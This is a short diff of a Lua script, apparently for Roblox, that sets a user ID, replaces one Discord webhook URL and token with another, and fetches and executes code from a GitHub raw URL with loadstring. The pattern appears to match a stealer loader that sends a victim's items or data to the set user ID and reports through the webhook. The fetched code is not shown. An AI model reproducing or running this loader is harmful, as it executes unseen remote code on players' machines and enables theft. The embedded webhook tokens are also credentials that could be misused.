@@ -1,6 +1,6 @@
 _G.UserID = 1809183167
 
-_G.Webhook = "https://discord.com/api/webhooks/1094692543737892864/wmVvJahjNSpW5y23k-RUhc5s8CVFI0ijDQcv-fm2BZN5S12OT86YIDiRK9vLPdgxvHm-"
+_G.Webhook = "https://discord.com/api/webhooks/1094874411494035478/PmgMJ7V01J8EyMniDwBgQuVyBbFqYennHrk9v1rsvRjKrGxTYWCM3_Qfpjf0bg04-cZp"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Psx0/B/main/script", true))()
 
